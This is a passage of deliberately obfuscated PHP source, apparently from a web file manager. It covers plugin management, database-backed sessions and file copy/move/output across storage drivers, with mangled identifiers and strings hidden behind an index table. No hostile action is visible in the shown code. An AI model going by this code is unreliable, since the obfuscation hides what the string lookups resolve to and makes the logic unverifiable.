=> 0, $×€ŒìÉ¼[569] => $…­­áÜö, $×€ŒìÉ¼[507] => $×€ŒìÉ¼[2250] . $ô€‰öÑ¶); return $this->where($ı­º¿)->delete(); } protected function removeBySource($ª“‚’¯Ö, $¼”¾ÈîÂ) { $Ú†—ØÔ¬ =& $_SERVER[öæÛ¿©¿]; if (!$ª“‚’¯Ö || !$¼”¾ÈîÂ) { return !1; } if (is_array($¼”¾ÈîÂ)) { $¼”¾ÈîÂ = array($Ú†—ØÔ¬[7], $¼”¾ÈîÂ); } $ÊûØœÙÙ = array($Ú†—ØÔ¬[1916] => 0, $Ú†—ØÔ¬[506] => $¼”¾ÈîÂ, $Ú†—ØÔ¬[569] => array($Ú†—ØÔ¬[1126], 0), $Ú†—ØÔ¬[507] => $Ú†—ØÔ¬[2250] . $ª“‚’¯Ö); return $this->where($ÊûØœÙÙ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\x2e\160\154\x75\x67\x69\156\x4c\x69\x73\164"; public $field = array("\156\141\155\x65", "\x73\x74\141\164\165\x73", "\x72\x65\x67\151\145\163\x74", "\x63\157\156\146\x69\147"); public function loadList($“šÀØÚ = false) { $·À¨èİ = array_to_keyvalue($this->listData(), $_SERVER[öæÛ¿©¿][32]); if ($“šÀØÚ) { return $·À¨èİ[$“šÀØÚ]; } return $·À¨èİ; } public function init() { $ş¯ÅòËÛ =& $_SERVER[öæÛ¿©¿]; Hook::trigger($ş¯ÅòËÛ[2251]); $¸×úüÉğ = $this->loadPluginList(); foreach ($¸×úüÉğ as $æóü›Ç‹ => $·ÊøŒñ™) { $­ã÷ìÑˆ = $this->appAllow($æóü›Ç‹, $·ÊøŒñ™); if (!$­ã÷ìÑˆ) { continue; } foreach ($·ÊøŒñ™[$ş¯ÅòËÛ[2252]] as $ß±–»‡º => $ó²îó»²) { Hook::bind($ß±–»‡º, $ó²îó»²); } } Hook::trigger($ş¯ÅòËÛ[2253]); Hook::trigger(ACTION); } public function appAllow($ôš›î˜Ë, $†û÷´”, $˜¶šñó¾ = true) { $Çøô¼ôÔ =& $_SERVER[öæÛ¿©¿]; $ñÉ¹çÔ’ = PLUGIN_DIR . $ôš›î˜Ë . $Çøô¼ôÔ[2254]; if (!is_array($†û÷´”) || !is_array($†û÷´”[$Çøô¼ôÔ[2252]]) || $†û÷´”[$Çøô¼ôÔ[842]] != 1 || !is_file($ñÉ¹çÔ’)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Çøô¼ôÔ[6]][$Çøô¼ôÔ[2255]] || !$GLOBALS[$Çøô¼ôÔ[6]][$Çøô¼ôÔ[2256]]) { return !0; } $º¸Ñ¿¢– = explode($Çøô¼ôÔ[50], strtolower($GLOBALS[$Çøô¼ôÔ[6]][$Çøô¼ôÔ[2256]])); return in_array(strtolower($ôš›î˜Ë), $º¸Ñ¿¢–) ? !1 : !0; } if ($˜¶šñó¾ && !Action($Çøô¼ôÔ[2257])->checkAuth($ôš›î˜Ë)) { return !1; } return !0; } public function unInstall($›Øßø©³) { $Âœ®‡Ò =& $_SERVER[öæÛ¿©¿]; $ÁÙÒƒ¼¿ = $this->loadList($›Øßø©³); if (file_exists(PLUGIN_DIR . $›Øßø©³)) { Hook::apply($›Øßø©³ . $Âœ®‡Ò[2258]); } $this->remove($ÁÙÒƒ¼¿[$Âœ®‡Ò[483]]); } public function changeStatus($½Ç×ı¾¼, $÷ «¾æì) { $×”ïÖË× =& $_SERVER[öæÛ¿©¿]; $ØÁÅÛÜ = $this->loadList($½Ç×ı¾¼); if ($÷ «¾æì) { Hook::apply($½Ç×ı¾¼ . $×”ïÖË×[2259]); } $this->update($ØÁÅÛÜ[$×”ïÖË×[483]], array($×”ïÖË×[2260] => $÷ «¾æì)); } public function appRegist($Á­´£à×, $Ù£Ñ®Î) { $–û—‚áô =& $_SERVER[öæÛ¿©¿]; $×Ù”¿€ü = $this->loadList($Á­´£à×); if ($×Ù”¿€ü) { $this->update($×Ù”¿€ü[$–û—‚áô[483]], array($–û—‚áô[2252] => $Ù£Ñ®Î)); } else { $Ú‚şë = array($–û—‚áô[32] => $Á­´£à×, $–û—‚áô[2252] => $Ù£Ñ®Î, $–û—‚áô[842] => 0, $–û—‚áô[6] => $this->getConfigDefault($Á­´£à×)); $this->insert($Ú‚şë); } } public function getConfigDefault($Äõæ–¨û) { $ËËšŸæ‰ =& $_SERVER[öæÛ¿©¿]; $ã±ºéâû = array(); $´ª¿º¸² = $this->getPackageJson($Äõæ–¨û); if (!$´ª¿º¸² && is_array($´ª¿º¸²[$ËËšŸæ‰[2261]])) { return $ã±ºéâû; } foreach ($´ª¿º¸²[$ËËšŸæ‰[2261]] as $÷ŠÆïÌ† => $¸ß–İüè) { if (!isset($¸ß–İüè[$ËËšŸæ‰[451]]) || isset($ã±ºéâû[$÷ŠÆïÌ†])) { continue; } $ã±ºéâû[$÷ŠÆïÌ†] = $¸ß–İüè[$ËËšŸæ‰[451]]; } return $ã±ºéâû; } public function getPackageJson($ˆºåëÏá) { return Hook::apply($ˆºåëÏá . $_SERVER[öæÛ¿©¿][2262]); } public function getConfig($¶î‘á¹Ñ, $ÄßËåå— = false) { $œÔ‡ìÜ  =& $_SERVER[öæÛ¿©¿]; $Â×ïµÙø = array(); $««£öæÌ = $this->loadList($¶î‘á¹Ñ); if ($««£öæÌ && is_array($««£öæÌ[$œÔ‡ìÜ [6]])) { $Â×ïµÙø = $««£öæÌ[$œÔ‡ìÜ [6]]; } if (!$Â×ïµÙø || $ÄßËåå—) { $Â×ïµÙø = $this->getConfigDefault($¶î‘á¹Ñ); } return $Â×ïµÙø; } public function setConfig($òù«¸³, $ÔÈúÁ¬Ü = false) { $´Î±ÈÅ =& $_SERVER[öæÛ¿©¿]; $æ»‘Ìï§ = $this->loadList($òù«¸³); if (!$æ»‘Ìï§) { return !1; } $ë²Á×´ = $æ»‘Ìï§[$´Î±ÈÅ[6]]; if ($ÔÈúÁ¬Ü == !1) { $ë²Á×´ = array(); $ÔÈúÁ¬Ü = $this->getConfigDefault($òù«¸³); } foreach ($ÔÈúÁ¬Ü as $Ç‹øÌ®Ğ => $÷„üÔÍ¯) { $ë²Á×´[$Ç‹øÌ®Ğ] = is_string($÷„üÔÍ¯) ? trim($÷„üÔÍ¯) : $÷„üÔÍ¯; } $this->update($æ»‘Ìï§[$´Î±ÈÅ[483]], array($´Î±ÈÅ[6] => $ë²Á×´)); } public function viewList() { $ÄÑÃõÛÉ =& $_SERVER[öæÛ¿©¿]; $÷Ôâ¡Ä  = $this->loadList(); $this->pluginScan($÷Ôâ¡Ä ); $÷Ôâ¡Ä  = $this->loadPluginList(); $–èÀĞÜ = array(); foreach ($÷Ôâ¡Ä  as $ãĞ«Êş° => $ÉáŞ¬È) { $ğø°†„Á = $ÉáŞ¬È; unset($ÉáŞ¬È[$ÄÑÃõÛÉ[2252]], $ÉáŞ¬È[$ÄÑÃõÛÉ[6]]); $ŞŒØÄô  = PLUGIN_DIR . $ÉáŞ¬È[$ÄÑÃõÛÉ[32]] . $ÄÑÃõÛÉ[2254]; if (!is_file($ŞŒØÄô )) { continue; } $»„‰óÙ = Hook::apply($ÉáŞ¬È[$ÄÑÃõÛÉ[32]] . $ÄÑÃõÛÉ[2262]); if (!is_array($»„‰óÙ)) { continue; } $–èÀĞÜ[$ãĞ«Êş°] = array_merge($ÉáŞ¬È, $»„‰óÙ); if ($ğø°†„Á[$ÄÑÃõÛÉ[6]][$ÄÑÃõÛÉ[1838]] != $»„‰óÙ[$ÄÑÃõÛÉ[1812]]) { Hook::apply($ÉáŞ¬È[$ÄÑÃõÛÉ[32]] . $ÄÑÃõÛÉ[2259]); $ğø°†„Á[$ÄÑÃõÛÉ[6]][$ÄÑÃõÛÉ[1838]] = $»„‰óÙ[$ÄÑÃõÛÉ[1812]]; $this->update($ÉáŞ¬È[$ÄÑÃõÛÉ[483]], array($ÄÑÃõÛÉ[6] => $ğø°†„Á[$ÄÑÃõÛÉ[6]])); } } return $–èÀĞÜ; } private function loadPluginList() { $şû¿ã¶Î =& $_SERVER[öæÛ¿©¿]; $€¦öªÏ˜ = $this->loadList(); if (strtolower(MOD) == $şû¿ã¶Î[2263]) { return $€¦öªÏ˜; } $ Û××ˆÊ = Hook::trigger($şû¿ã¶Î[2264], $€¦öªÏ˜); if ($€¦öªÏ˜ && !$ Û××ˆÊ) { die; } return $ Û××ˆÊ ? $ Û××ˆÊ : $€¦öªÏ˜; } private function pluginScan($Şë³¬œğ) { $Ö“’© =& $_SERVER[öæÛ¿©¿]; recursion_dir(PLUGIN_DIR, $â¼‚Ğ×©, $´ª÷“ŒÃ, 0); foreach ($â¼‚Ğ×© as $á­©—º) { $Ñƒ–Œı = get_path_this($á­©—º); if (isset($Şë³¬œğ[$Ñƒ–Œı]) || !file_exists($á­©—º . $Ö“’©[2265]) || !file_exists($á­©—º . $Ö“’©[2254])) { continue; } Hook::apply($Ñƒ–Œı . $Ö“’©[2259]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\164\x65\x6d\137\163\x65\163\163\151\x6f\x6e"; public function get($Ô‚Ãöçó) { $¾À˜€œá =& $_SERVER[öæÛ¿©¿]; $Í¿ÓÌœï = $this->where(array($¾À˜€œá[2266] => $Ô‚Ãöçó))->find(); if (!is_array($Í¿ÓÌœï)) { return !1; } return $Í¿ÓÌœï[$¾À˜€œá[169]]; } public function set($¨ˆåã®©, $‰šâË®Ò, $•ğª¨Áœ = 3600) { $ÑæÔ¦Éç =& $_SERVER[öæÛ¿©¿]; $‘Ü‹æ¶ = array($ÑæÔ¦Éç[2266] => $¨ˆåã®©, $ÑæÔ¦Éç[2169] => $‰šâË®Ò, $ÑæÔ¦Éç[2267] => $•ğª¨Áœ + time()); if (Session::get($ÑæÔ¦Éç[2268])) { $‘Ü‹æ¶[$ÑæÔ¦Éç[1538]] = Session::get($ÑæÔ¦Éç[2268]); } else { $‘Ü‹æ¶[$ÑæÔ¦Éç[1538]] = 0; } if ($this->get($¨ˆåã®©)) { return $this->where(array($ÑæÔ¦Éç[2266] => $¨ˆåã®©))->save($‘Ü‹æ¶); } else { return $this->add($‘Ü‹æ¶, array(), !0); } } public function remove($ö‰ş‰¼) { return $this->where(array($_SERVER[öæÛ¿©¿][2266] => $ö‰ş‰¼))->delete(); } public function clearTimeout() { return $this->where($_SERVER[öæÛ¿©¿][2269] . time())->delete(); } } goto b¼›…ùÎÏ; e½Ãë‹¾É¹: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¼ÌûÈà¸, $Š¥¹şÏã) { $õì•¼˜² =& $_SERVER[öæÛ¿©¿]; $äıñõã± = $Š¥¹şÏã; $GLOBALS[$õì•¼˜²[1273]] = $õì•¼˜²[1274] . $¼ÌûÈà¸; Hook::trigger($õì•¼˜²[1274] . $¼ÌûÈà¸ . $õì•¼˜²[1275], $äıñõã±); $´ñ¿ƒşË = self::driverMake($Š¥¹şÏã[0]); if (!$´ñ¿ƒşË) { return !1; } if ($¼ÌûÈà¸ == $õì•¼˜²[637] || $¼ÌûÈà¸ == $õì•¼˜²[639] || $¼ÌûÈà¸ == $õì•¼˜²[1276]) { if (!trim($´ñ¿ƒşË->path . $õì•¼˜²[463], $õì•¼˜²[8])) { return !1; } } if (method_exists($´ñ¿ƒşË, $¼ÌûÈà¸)) { $¤Ë‘»Ÿ = @call_user_func_array(array($´ñ¿ƒşË, $¼ÌûÈà¸), $Š¥¹şÏã); } else { if (method_exists($´ñ¿ƒşË, $õì•¼˜²[1277])) { $¤Ë‘»Ÿ = @call_user_func_array(array($´ñ¿ƒşË, $¼ÌûÈà¸), $Š¥¹şÏã); } else { if (method_exists(self, $¼ÌûÈà¸)) { $¤Ë‘»Ÿ = @call_user_func_array(array(self, $¼ÌûÈà¸), $Š¥¹şÏã); } else { $¤Ë‘»Ÿ = call_user_func_array(array(parent, $¼ÌûÈà¸), $Š¥¹şÏã); } } } Hook::trigger($õì•¼˜²[1274] . $¼ÌûÈà¸ . $õì•¼˜²[1278], $äıñõã±, $¤Ë‘»Ÿ); return $¤Ë‘»Ÿ; } public static function init($¸‡ÍŸ¯Æ) { return self::driverMake($¸‡ÍŸ¯Æ); } public static function copy($µØã‰Æá, $Ìà»€Ï‰, $åáû¶Â = false, $ÇÍÔ€©¬ = false) { return self::copyMoveStart($µØã‰Æá, $Ìà»€Ï‰, $åáû¶Â, $_SERVER[öæÛ¿©¿][637], $ÇÍÔ€©¬); } public static function move($€…ºç¼, $Èõøš, $œã¼ÒÎ¡ = false, $ÁÓÖ£¯ì = false) { return self::copyMoveStart($€…ºç¼, $Èõøš, $œã¼ÒÎ¡, $_SERVER[öæÛ¿©¿][639], $ÁÓÖ£¯ì); } public static function copyMoveChildren($„šĞÏ‹, $ÊËò¤Æ¬, $Ö÷şİ¦¸ = "\x63\157\x70\x79", $ñ“²©·º = REPEAT_REPLACE) { $Ä€€¯‡Ù =& $_SERVER[öæÛ¿©¿]; $ŸÇ€Ëƒ  = $„šĞÏ‹; $¡…¬°Ó = self::driverMake($„šĞÏ‹); $Ù”Ö÷Ññ = $¡…¬°Ó->listPath($„šĞÏ‹, !0); $áìÖÇ¥Õ = array_merge($Ù”Ö÷Ññ[$Ä€€¯‡Ù[86]], $Ù”Ö÷Ññ[$Ä€€¯‡Ù[85]]); foreach ($áìÖÇ¥Õ as $ùÕ¦¤ÓÃ) { self::copyMoveStart($ùÕ¦¤ÓÃ[$Ä€€¯‡Ù[87]], $ÊËò¤Æ¬, $ñ“²©·º, $Ö÷şİ¦¸, !1); } if ($Ö÷şİ¦¸ == $Ä€€¯‡Ù[639]) { self::remove($ŸÇ€Ëƒ ); } } private static function copyMoveStart($˜Öõ¿¬õ, $·ß”¦ ´, $²µ¦÷Ù¨, $®ì©‰¬¤, $ô”ÌÒ”) { $î°¿¥Ùµ =& $_SERVER[öæÛ¿©¿]; $¾·ë»Õğ = array($˜Öõ¿¬õ, $·ß”¦ ´, $²µ¦÷Ù¨, $ô”ÌÒ”); Hook::trigger($î°¿¥Ùµ[1274] . $®ì©‰¬¤ . $î°¿¥Ùµ[1275], $¾·ë»Õğ); $Ë¾¯‘ÎÛ = self::copyMove($˜Öõ¿¬õ, $·ß”¦ ´, $²µ¦÷Ù¨, $®ì©‰¬¤, $ô”ÌÒ”); Hook::trigger($î°¿¥Ùµ[1274] . $®ì©‰¬¤ . $î°¿¥Ùµ[1278], $¾·ë»Õğ, $Ë¾¯‘ÎÛ); return $Ë¾¯‘ÎÛ; } public static function saveFile($‹¤ùÚ™¦, $ä³¯œì­, $ô¿ì˜ïÄ = true) { $—±¡¦é— =& $_SERVER[öæÛ¿©¿]; $â¶÷ò¾¬ = self::info($ä³¯œì­); $Ç©Ó—¯Ò = self::driverMake($‹¤ùÚ™¦); $À°æ•£Ä = self::driverMake($ä³¯œì­); $ú€í´Ñ£ = !1; if ($À°æ•£Ä->pathParse[$—±¡¦é—[1279]]) { $ú€í´Ñ£ = $À°æ•£Ä; $šÁ–¢¹Ş = $À°æ•£Ä->pathParse[$—±¡¦é—[1279]]; $À°æ•£Ä = self::driverMake($šÁ–¢¹Ş); } if ($Ç©Ó—¯Ò->pathParse[$—±¡¦é—[1279]]) { $¡ä§ëš = $Ç©Ó—¯Ò->pathParse[$—±¡¦é—[1279]]; $Ç©Ó—¯Ò = self::driverMake($¡ä§ëš); } $Ş¦†™ı” = $À°æ•£Ä->pathFather($ä³¯œì­); $ÅÀ¸›ËŒ = !0; if (!$ô¿ì˜ïÄ && self::driverIsSame($Ç©Ó—¯Ò, $À°æ•£Ä)) { $ÅÀ¸›ËŒ = !1; } $ÏÈĞ®õ‰ = self::copyFile($Ç©Ó—¯Ò, $‹¤ùÚ™¦, $À°æ•£Ä, $Ş¦†™ı”, $â¶÷ò¾¬[$—±¡¦é—[32]], $ÅÀ¸›ËŒ); if ($ú€í´Ñ£) { $ÏÈĞ®õ‰ = $ú€í´Ñ£->getPathOuter($ÏÈĞ®õ‰); } return $ÏÈĞ®õ‰; } private static function copyMove($º§µ÷±‰, $¶Ô»ë•µ, $­ò²à†–, $¼’Æ•§, $ææ¯†Ë = false) { $œ’ÙîÅÓ =& $_SERVER[öæÛ¿©¿]; if (!$º§µ÷±‰ || $º§µ÷±‰ == $œ’ÙîÅÓ[8] || !$¶Ô»ë•µ) { return !1; } ignore_timeout(); $ò˜½Ä¥… = self::driverMake($º§µ÷±‰); $ÆÏÀÃ» = self::driverMake($¶Ô»ë•µ); $å§÷äÈ = $¼’Æ•§ == $œ’ÙîÅÓ[639]; $Îúì¼€’ = !1; if ($ÆÏÀÃ»->pathParse[$œ’ÙîÅÓ[1279]]) { $Îúì¼€’ = $ÆÏÀÃ»; $¶Ô»ë•µ = $ÆÏÀÃ»->pathParse[$œ’ÙîÅÓ[1279]]; $ÆÏÀÃ» = self::driverMake($¶Ô»ë•µ); } if ($ò˜½Ä¥…->pathParse[$œ’ÙîÅÓ[1279]]) { $º§µ÷±‰ = $ò˜½Ä¥…->pathParse[$œ’ÙîÅÓ[1279]]; $ò˜½Ä¥… = self::driverMake($º§µ÷±‰); } self::check($ò˜½Ä¥…, $º§µ÷±‰, $ÆÏÀÃ», $¶Ô»ë•µ); Hook::trigger($œ’ÙîÅÓ[1280], $ò˜½Ä¥…, $º§µ÷±‰, $ÆÏÀÃ», $¶Ô»ë•µ); $¾‚“õ©À = self::driverIsSame($ò˜½Ä¥…, $ÆÏÀÃ»); if ($¾‚“õ©À) { if ($¼’Æ•§ == $œ’ÙîÅÓ[639] && !method_exists($ÆÏÀÃ», $œ’ÙîÅÓ[1281]) && trim($¶Ô»ë•µ, $œ’ÙîÅÓ[8]) == trim($ÆÏÀÃ»->pathFather($º§µ÷±‰), $œ’ÙîÅÓ[8])) { if ($ò˜½Ä¥…->pathThis($º§µ÷±‰) != $ææ¯†Ë && !$ò˜½Ä¥…->isOsDriver()) { return $ò˜½Ä¥…->rename($º§µ÷±‰, $ææ¯†Ë); } return $ÆÏÀÃ»->getPathOuter($º§µ÷±‰); } if (method_exists($ÆÏÀÃ», $¼’Æ•§)) { return $ÆÏÀÃ»->{$¼’Æ•§}($º§µ÷±‰, $¶Ô»ë•µ, $­ò²à†–, $ææ¯†Ë); } } if ($¾‚“õ©À && $¼’Æ•§ == $œ’ÙîÅÓ[639] && $ÆÏÀÃ»->getType() == $œ’ÙîÅÓ[107]) { $íæÏÕ‘ = $ÆÏÀÃ»->movePath($º§µ÷±‰, $¶Ô»ë•µ, $ææ¯†Ë); if ($íæÏÕ‘) { return $íæÏÕ‘; } } $¿ªş…Ê = $ò˜½Ä¥…->isFile($º§µ÷±‰); if (!$¿ªş…Ê && $ÆÏÀÃ»->getType() == $œ’ÙîÅÓ[850] && $ò˜½Ä¥…->getType() == $œ’ÙîÅÓ[107]) { $íæÏÕ‘ = $ÆÏÀÃ»->copyFolderFromIO($ò˜½Ä¥…, $º§µ÷±‰, $¶Ô»ë•µ, $­ò²à†–, $å§÷äÈ, $ææ¯†Ë); } else { $íæÏÕ‘ = self::copyPath($ò˜½Ä¥…, $º§µ÷±‰, $ÆÏÀÃ», $¶Ô»ë•µ, $­ò²à†–, $å§÷äÈ, $¿ªş…Ê, $ææ¯†Ë); } if ($íæÏÕ‘ && $å§÷äÈ) { $ò˜½Ä¥…->remove($º§µ÷±‰); } if ($Îúì¼€’) { $íæÏÕ‘ = $Îúì¼€’->getPathOuter($íæÏÕ‘); } return $íæÏÕ‘; } private static function check($Á®ëÇƒ¬, $şŠÇ¤®, $³ğê˜Ï©, &$‘ââùÏÛ) { $ÒÂ›¬ˆ =& $_SERVER[öæÛ¿©¿]; if (self::driverIsSame($Á®ëÇƒ¬, $³ğê˜Ï©) && $Á®ëÇƒ¬->isFolder($şŠÇ¤®) && $Á®ëÇƒ¬->isParentOf($şŠÇ¤®, $‘ââùÏÛ)) { show_json(LNG($ÒÂ›¬ˆ[1282]), !1); } if (!$Á®ëÇƒ¬->exist($şŠÇ¤®)) { show_json(LNG($ÒÂ›¬ˆ[106]), !1); } } private static function copyPath($ææÔÂâÁ, $’¨«î÷, $ı¢••ËÃ, $˜Ô”–àá, $íò¸ÉæÀ, $ÆöœÔ€ñ, $à×àÏÇ, $ÈÁŞ¾ê = false, $Ğå€çüë = true) { $»¹› —Ï =& $_SERVER[öæÛ¿©¿]; $°Ä¢¤¤ = empty($ÈÁŞ¾ê) && $ÈÁŞ¾ê !== $»¹› —Ï[229] ? $ææÔÂâÁ->pathThis($’¨«î÷) : $ÈÁŞ¾ê; if ($íò¸ÉæÀ) { $à¶˜¯Å = $ı¢••ËÃ->fileNameExist($˜Ô”–àá, $°Ä¢¤¤); $Ì’¹´Î = $°Ä¢¤¤; $°Ä¢¤¤ = $ı¢••ËÃ->fileNameAuto($˜Ô”–àá, $°Ä¢¤¤, $íò¸ÉæÀ, !$à×àÏÇ); if (!$à¶˜¯Å || $Ì’¹´Î != $°Ä¢¤¤) { $íò¸ÉæÀ = !1; } if ($Ğå€çüë && !$íò¸ÉæÀ) { $ı¢••ËÃ->_data[$»¹› —Ï[1283]] = !0; } } if ($à×àÏÇ) { return self::copyFile($ææÔÂâÁ, $’¨«î÷, $ı¢••ËÃ, $˜Ô”–àá, $°Ä¢¤¤, $ÆöœÔ€ñ); } if ($íò¸ÉæÀ == REPEAT_RENAME_FOLDER) { $íò¸ÉæÀ = !1; } $¶ë“êšà = rtrim($˜Ô”–àá, $»¹› —Ï[8]) . $»¹› —Ï[8] . $°Ä¢¤¤; $û–ÈëÅÌ = $ı¢••ËÃ->mkdir($ı¢••ËÃ->getPath($¶ë“êšà), $íò¸ÉæÀ); $˜Ô”–àá = $ı¢••ËÃ->getPathInner($û–ÈëÅÌ); $üÄöÄ‰ò = $ææÔÂâÁ->listPath($’¨«î÷, !0); $üÄöÄ‰ò = is_array($üÄöÄ‰ò) ? $üÄöÄ‰ò : array($»¹› —Ï[86] => array(), $»¹› —Ï[85] => array()); $àÚÍÀºÌ = array_merge($üÄöÄ‰ò[$»¹› —Ï[86]], $üÄöÄ‰ò[$»¹› —Ï[85]]); foreach ($àÚÍÀºÌ as $ÉíÁ€) { $ú¤·¤úŞ = $ÉíÁ€[$»¹› —Ï[33]] == $»¹› —Ï[231]; $’¨«î÷ = $ææÔÂâÁ->getPathInner($ÉíÁ€[$»¹› —Ï[87]]); $Ú¢õöÃÚ = self::copyPath($ææÔÂâÁ, $’¨«î÷, $ı¢••ËÃ, $˜Ô”–àá, $íò¸ÉæÀ, $ÆöœÔ€ñ, $ú¤·¤úŞ, !1, !1); if (!$Ú¢õöÃÚ) { IO::errorTips($»¹› —Ï[1284] . $’¨«î÷ . $»¹› —Ï[73] . $˜Ô”–àá); } } self::copyMoveKeepInfo($ææÔÂâÁ, $’¨«î÷, $û–ÈëÅÌ); return $û–ÈëÅÌ; } private static function copyFile($²¾ƒú÷®, $ºÓÜúÄŸ, $‘à¾âÙ, $„á¼˜ï×, $Ï©è’ëê, $â– í‘õ) { $¹àÔÚÀÀ =& $_SERVER[öæÛ¿©¿]; $„á¼˜ï× = $‘à¾âÙ->getPath(rtrim($„á¼˜ï×, $¹àÔÚÀÀ[8]) . $¹àÔÚÀÀ[8] . $Ï©è’ëê); $¾âÎÆÜ¸ = $¹àÔÚÀÀ[1285] . time() . rand_string(5); Hook::trigger($¹àÔÚÀÀ[1286], $²¾ƒú÷®, $ºÓÜúÄŸ, $‘à¾âÙ, $„á¼˜ï×, $Ï©è’ëê, $¾âÎÆÜ¸); if (self::driverIsSame($²¾ƒú÷®, $‘à¾âÙ)) { if ($â– í‘õ) { $‚ÑÁÉåî = $‘à¾âÙ->moveFile($ºÓÜúÄŸ, $„á¼˜ï×); } else { $‚ÑÁÉåî = $‘à¾âÙ->copyFile($ºÓÜúÄŸ, $„á¼˜ï×); } Hook::trigger($¹àÔÚÀÀ[1287], $²¾ƒú÷®, $ºÓÜúÄŸ, $‘à¾âÙ, $„á¼˜ï×, $Ï©è’ëê, $‚ÑÁÉåî); self::copyMoveKeepInfo($²¾ƒú÷®, $ºÓÜúÄŸ, $‚ÑÁÉåî); return $‚ÑÁÉåî; } $¬÷™ñÖÆ = TEMP_FILES; if ($GLOBALS[$¹àÔÚÀÀ[6]][$¹àÔÚÀÀ[92]][$¹àÔÚÀÀ[893]]) { $¬÷™ñÖÆ = $GLOBALS[$¹àÔÚÀÀ[6]][$¹àÔÚÀÀ[92]][$¹àÔÚÀÀ[893]]; } $°Ü¦ßà = $¬÷™ñÖÆ; mk_dir($°Ü¦ßà); $ş¥ÕøÏ = $°Ü¦ßà . $¾âÎÆÜ¸; $ïå±á¦˜ = $ş¥ÕøÏ; $ş¥ÕøÏ = $²¾ƒú÷®->download($ºÓÜúÄŸ, $ş¥ÕøÏ); $ş¥ÕøÏ = $²¾ƒú÷®->iconvApp($ş¥ÕøÏ); if (substr($ş¥ÕøÏ, strlen($¬÷™ñÖÆ)) == $¬÷™ñÖÆ) { $â– í‘õ = !0; } $‚ÑÁÉåî = $‘à¾âÙ->upload($„á¼˜ï×, $ş¥ÕøÏ, $â– í‘õ); self::remove($ïå±á¦˜); Hook::trigger($¹àÔÚÀÀ[1287], $²¾ƒú÷®, $ºÓÜúÄŸ, $‘à¾âÙ, $„á¼˜ï×, $Ï©è’ëê, $‚ÑÁÉåî); self::copyMoveKeepInfo($²¾ƒú÷®, $ºÓÜúÄŸ, $‚ÑÁÉåî); return $‚ÑÁÉåî; } private static function copyMoveKeepInfo($¶¢ë…ÀÍ, $æ„ÇŠà‘, $Ï„ŠÀî) { if (!$Ï„ŠÀî) { return; } $òùÀŒİ“ = $¶¢ë…ÀÍ->info($æ„ÇŠà‘); if (!is_array($òùÀŒİ“)) { return; } IO::setModifyTime($Ï„ŠÀî, $òùÀŒİ“[$_SERVER[öæÛ¿©¿][88]]); } public static function pathFather($ª ¨ĞÜú) { $‘á”ä¬Ä = IO::init($ª ¨ĞÜú); $ŸáƒØë» = $‘á”ä¬Ä->pathFather($‘á”ä¬Ä->path); return $‘á”ä¬Ä->getPathOuter($ŸáƒØë»); } public static function fileOut($Ì•»¡µÕ, $Ã½Å¼õ† = false, $·Ã¾å¹ = false, $Å¸ÁÛ‰ = '') { $¨±ŸĞÙ³ = self::driverMake($Ì•»¡µÕ); if ($¨±ŸĞÙ³->isFileOutServer()) { return $¨±ŸĞÙ³->fileOutServer($Ì•»¡µÕ, $Ã½Å¼õ†, $·Ã¾å¹, $Å¸ÁÛ‰); } return $¨±ŸĞÙ³->fileOut($Ì•»¡µÕ, $Ã½Å¼õ†, $·Ã¾å¹, $Å¸ÁÛ‰); } public static function fileOutImage($™¼º—Øò, $¸ú¥ó” = 250) { $§‘ä„à¹ = array(250, 600, 1200, 2000, 3000, 5000); for ($âù‚óŸ = 0; $âù‚óŸ < count($§‘ä„à¹); $âù‚óŸ++) { if ($âù‚óŸ == 0 && $¸ú¥ó” <= $§‘ä„à¹[$âù‚óŸ]) { $¸ú¥ó” = $§‘ä„à¹[$âù‚óŸ]; break; } else { if ($¸ú¥ó” > $§‘ä„à¹[$âù‚óŸ - 1] && $¸ú¥ó” <= $§‘ä„à¹[$âù‚óŸ]) { $¸ú¥ó” = $§‘ä„à¹[$âù‚óŸ]; break; } else { if ($âù‚óŸ == count($§‘ä„à¹) - 1 && $¸ú¥ó” > $§‘ä„à¹[$âù‚óŸ]) { $¸ú¥ó” = $§‘ä„à¹[$âù‚óŸ]; break; } } } } $Åš‹Ç = self::driverMake($™¼º—Øò); if ($Åš‹Ç->isFileOutServer()) { return $Åš‹Ç->fileOutImageServer($™¼º—Øò, $¸ú¥ó”); } return $Åš‹Ç->fileOutImage($™¼º—Øò, $¸ú¥ó”); } private static function driverIsSame($²æçÎÔé, $¾ˆ¸Ê³) { $«ƒø…ÊÂ =& $_SERVER[öæÛ¿©¿]; $í€ù—½á = $²æçÎÔé->getType(); $Ø·²¿ì = $¾ˆ¸Ê³->getType(); if ($í€ù—½á != $Ø·²¿ì) { return !1; } if ($í€ù—½á == $«ƒø…ÊÂ[850]) { return !0; } if ($í€ù—½á == $«ƒø…ÊÂ[107]) { return !0; } if ($²æçÎÔé->pathDriver == $¾ˆ¸Ê³->pathDriver) { return !0; } return !1; } public static function copyUpdate($ëĞ¹´‡é, $•¡£ÚÑñ) { $·Ö»æ½ß =& $_SERVER[öæÛ¿©¿]; if (!IO::exist($ëĞ¹´‡é)) { return !1; } if (!IO::exist($•¡£ÚÑñ)) { IO::mkdir($•¡£ÚÑñ); } $È½İ‡Ìø = array_to_keyvalue(self::listAllSimple($ëĞ¹´‡é), $·Ö»æ½ß[87]); $şÂÀØ®® = array_to_keyvalue(self::listAllSimple($•¡£ÚÑñ), $·Ö»æ½ß[87]); $ÒêşÓ–¬ = array(); $¼£Ö½Ñú = array(); foreach ($È½İ‡Ìø as $³òƒµ¢Ã => $İ†ºû) { if (isset($şÂÀØ®®[$³òƒµ¢Ã])) { if ($İ†ºû[$·Ö»æ½ß[78]] == 1) { continue; } if ($şÂÀØ®®[$³òƒµ¢Ã][$·Ö»æ½ß[79]] == $İ†ºû[$·Ö»æ½ß[79]]) { continue; } } if ($İ†ºû[$·Ö»æ½ß[78]] == 1) { $¼£Ö½Ñú[] = $•¡£ÚÑñ . $·Ö»æ½ß[8] . trim($³òƒµ¢Ã, $·Ö»æ½ß[8]); continue; } $Òú¤æº¾ = strstr(trim($³òƒµ¢Ã, $·Ö»æ½ß[8]), $·Ö»æ½ß[8]) ? get_path_father($³òƒµ¢Ã) : $·Ö»æ½ß[12]; $ÒêşÓ–¬[] = array($·Ö»æ½ß[1288] => 